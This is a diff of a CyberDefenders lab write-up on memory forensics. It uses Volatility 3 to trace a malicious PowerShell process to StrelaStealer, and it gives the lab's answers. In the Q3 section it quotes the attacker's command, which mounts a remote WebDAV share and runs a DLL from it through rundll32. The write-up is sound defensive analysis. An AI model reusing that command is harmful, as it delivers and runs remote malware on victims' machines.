@@ -2,7 +2,7 @@
 
 ## Overview
 
-In this CyberDefenders lab, I investigated a 2 GB Windows memory dump after suspicious activity was detected on an internal workstation. I used Volatility 3 to identify the malicious process, trace its parent, review its command line, and connect the activity to the StrelaStealer malware family.
+This CyberDefenders lab focuses on a 2 GB Windows memory dump captured after suspicious activity on an internal workstation. Volatility 3 reveals the malicious process, its parent, its command line, and its connection to the StrelaStealer malware family.
 
 ## Challenge Details
 
@@ -19,9 +19,9 @@ In this CyberDefenders lab, I investigated a 2 GB Windows memory dump after susp
 - Volatility 3
 - VirusTotal
 
-## Environment Setup
+## Memory Image Profile
 
-I set up Volatility 3 in Kali Linux and started by profiling the memory image.
+The `windows.info` output provides the basic profile of the memory image.
 
 ```bash
 python vol.py -f <path_to_memory_dump> windows.info
@@ -37,9 +37,9 @@ The output identified the system as Windows 10, showed the NT root as `C:\Window
 
 ### Q1: What is the malicious process?
 
-**Answer:** `powershell.exe`
+**Thinking process:** The `windows.malfind` results flag a PowerShell process with PID `3692` as suspicious.
 
-I used the `windows.malfind` plugin and found a suspicious PowerShell process with PID `3692`.
+**Answer:** `powershell.exe`
 
 ```bash
 python vol.py -f <path_to_memory_dump> windows.malfind
@@ -49,9 +49,9 @@ python vol.py -f <path_to_memory_dump> windows.malfind
 
 ### Q2: What is the parent PID of the malicious process?
 
-**Answer:** `4210`
+**Thinking process:** The `windows.pstree` output shows PID `3692` linked to parent PID `4210`.
 
-I used `windows.pstree` to trace PID 3692 back to its parent. The parent process had PID 4210 and may have already ended before the memory was captured.
+**Answer:** `4210`
 
 ```bash
 python vol.py -f <path_to_memory_dump> windows.pstree | grep "3692"
@@ -61,11 +61,11 @@ python vol.py -f <path_to_memory_dump> windows.pstree | grep "3692"
 
 <img width="1291" height="182" alt="Parent PID 4210 in the process tree" src="https://github.com/user-attachments/assets/b2610ef3-59a9-4c13-83fc-a81bf714acb1" />
 
-### Q3 and Q4: What second-stage file and remote share were used?
+### Q3: What filename was used for the second-stage payload?
 
-**Answers:** File: `3435.dll` | Shared directory: `davwwwroot`
+**Thinking process:** The command passes a remote DLL path to `rundll32`. The filename at the end of that path is the second-stage payload.
 
-The PowerShell command connected to the remote WebDAV share and used `rundll32` to run `3435.dll` directly from it.
+**Answer:** `3435.dll`
 
 ```powershell
 powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
@@ -73,19 +73,25 @@ powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundl
 
 <img width="1042" height="41" alt="Second-stage DLL file in the PowerShell command" src="https://github.com/user-attachments/assets/5a86380f-9f16-4126-9e80-95377128ca7f" />
 
+### Q4: What shared directory was accessed on the remote server?
+
+**Thinking process:** The UNC path places the share name between the remote server and the DLL filename.
+
+**Answer:** `davwwwroot`
+
 <img width="1290" height="42" alt="Remote davwwwroot share in the command line" src="https://github.com/user-attachments/assets/82d4def7-60fc-48d6-b4ce-c12df5ca633f" />
 
 ### Q5: What MITRE ATT&CK sub-technique matches this execution method?
 
-**Answer:** `T1218.011` - Signed Binary Proxy Execution: Rundll32
+**Thinking process:** The command uses the trusted Windows utility `rundll32.exe` to execute a malicious DLL, matching the Rundll32 sub-technique.
 
-The attacker abused the trusted Windows utility `rundll32.exe` to execute a malicious DLL. This method can make malicious execution look like normal Windows activity.
+**Answer:** `T1218.011` - Signed Binary Proxy Execution: Rundll32
 
 ### Q6: Which username ran the malicious process?
 
-**Answer:** `Elon`
+**Thinking process:** The `windows.getsids.GetSIDs` results for PID `3692` map the process SID to the user account and show elevated privileges.
 
-I used the `windows.getsids.GetSIDs` plugin to identify the account tied to PID 3692. The results also showed that the account had administrator access and a high integrity level.
+**Answer:** `Elon`
 
 ```bash
 python vol.py -f <path_to_memory_dump> windows.getsids.GetSIDs | grep "3692"
@@ -95,9 +101,9 @@ python vol.py -f <path_to_memory_dump> windows.getsids.GetSIDs | grep "3692"
 
 ### Q7: What is the malware family?
 
-**Answer:** `StrelaStealer`
+**Thinking process:** VirusTotal relations for `45.9.74.32` connect the remote infrastructure and related files to an infostealer known for targeting email credentials.
 
-I searched the remote IP address `45.9.74.32` in VirusTotal and reviewed the related files. The results connected the activity to StrelaStealer, an infostealer known for targeting email account credentials.
+**Answer:** `StrelaStealer`
 
 <img width="1871" height="951" alt="VirusTotal evidence connecting the IP to StrelaStealer" src="https://github.com/user-attachments/assets/63e8a823-c45f-43af-9564-9edd12405405" />
 
